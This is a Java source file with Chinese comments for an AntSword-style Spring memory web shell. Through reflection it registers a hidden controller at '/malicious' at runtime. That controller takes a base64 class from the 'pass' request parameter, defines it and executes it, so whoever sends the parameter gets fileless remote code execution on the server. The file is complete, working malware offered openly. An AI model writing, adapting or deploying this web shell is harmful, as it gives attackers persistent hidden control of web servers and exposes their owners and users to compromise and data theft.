import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

public class AntSwordAddController extends ClassLoader{

    // 第一个构造函数
    public AntSwordAddController() throws ClassNotFoundException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, InvocationTargetException {
        System.out.println("gouzao ......");
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        // 可选步骤，判断url是否存在
        AbstractHandlerMethodMapping abstractHandlerMethodMapping = context.getBean(AbstractHandlerMethodMapping.class);
        Method method = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping").getDeclaredMethod("getMappingRegistry");
        method.setAccessible(true);
        Object  mappingRegistry = (Object) method.invoke(abstractHandlerMethodMapping);
        Field field = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry").getDeclaredField("urlLookup");
        field.setAccessible(true);
        Map urlLookup = (Map) field.get(mappingRegistry);
        Iterator urlIterator = urlLookup.keySet().iterator();
        List<String> urls = new ArrayList();
        while (urlIterator.hasNext()){
            String urlPath = (String) urlIterator.next();
            if ("/malicious".equals(urlPath)){
                System.out.println("url已存在");
                return;
            }
        }
        // 可选步骤，判断url是否存在
        // 2. 通过反射获得自定义 controller 中test的 Method 对象
        Method method2 = AntSwordAddController.class.getMethod("test");
        // 3. 定义访问 controller 的 URL 地址
        PatternsRequestCondition url = new PatternsRequestCondition("/malicious");
        // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 5. 在内存中动态注册 controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        // 创建用于处理请求的对象，加入“aaa”参数是为了触发第二个构造函数避免无限循环
        AntSwordAddController antSwordAddController = new AntSwordAddController("aaa");
        mappingHandlerMapping.registerMapping(info, antSwordAddController, method2);
    }
    // 第二个构造函数
    public AntSwordAddController(String aaa) {}
    // controller指定的处理方法
    public void test() throws Exception {
        // 获取request和response对象
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();

        // AntSword MemShell
        String cls = request.getParameter("pass");
        if (cls != null) {
            new AntSwordAddController(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(new Object[]{request,response});
        }
    }

    public AntSwordAddController(ClassLoader z) {
        super(z);
    }

    public Class g(byte[] b) {
        return defineClass(b, 0, b.length);
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class<?> clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])clazz.getMethod("decodeBuffer", new Class[] { String.class }).invoke(clazz.newInstance(), new Object[] { str });
        } catch (Exception e) {
            Class<?> clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder", new Class[0]).invoke(null, new Object[0]);
            return (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
        }
    }
}